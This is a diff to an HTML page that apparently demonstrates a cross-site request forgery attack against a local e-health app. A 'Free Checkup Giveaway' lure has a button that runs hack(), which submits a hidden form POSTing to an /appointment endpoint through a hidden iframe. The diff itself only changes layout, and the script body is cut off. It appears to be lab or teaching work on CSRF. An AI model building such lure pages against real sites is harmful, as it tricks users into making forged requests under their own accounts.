@@ -43,7 +43,7 @@
         .blur {
             background: (255 255 255 / 0.2);
             backdrop-filter: blur(10px);
-            height: 100vh;
+            height: 100dvh;
             width: 100%;
         }
     </style>
@@ -51,7 +51,7 @@
 </head>
 
 
-<body style="overflow-y: hidden;">
+<body style="overflow-y: hidden;" class="backdrop">
 
     <form hidden id="hack" target="csrf-frame" action="http://127.0.0.1:5000/appointment" method="POST"
         autocomplete="off">
@@ -68,21 +68,19 @@
     </form>
 
     <iframe hidden name="csrf-frame" id="frame" width="1000px" height="1000px"></iframe>
-    <div class="backdrop">
-        <div class="blur">
-            <div class="contain">
-            <img src = "./logo-no-backgroundehealth.png" loading="lazy" style="padding-bottom: 2rem;">
-                <h1 class="">Free Checkup Giveaway</h1>
-                <p class="">Enter for a chance to win a free checkup at our clinic!</p>
+    <div class="blur">
+        <div class="contain">
+            <img src="./logo-no-backgroundehealth.png" loading="lazy" style="padding-bottom: 2rem;">
+            <h1 class="">Free Checkup Giveaway</h1>
+            <p class="">Enter for a chance to win a free checkup at our clinic!</p>
 
-                <button onClick="hack();" id="button" class="btn text-center buttn"
-                    style="background-color: #0baccc;">Click
-                    here to Participate!</button>
-                <br>
-                <div id="warning"></div>
-            </div>
+            <button onClick="hack();" id="button" class="btn text-center buttn" style="background-color: #0baccc;">Click
+                here to Participate!</button>
+            <br>
+            <div id="warning"></div>
         </div>
     </div>
+
 </body>
 <script>
     function hack() {
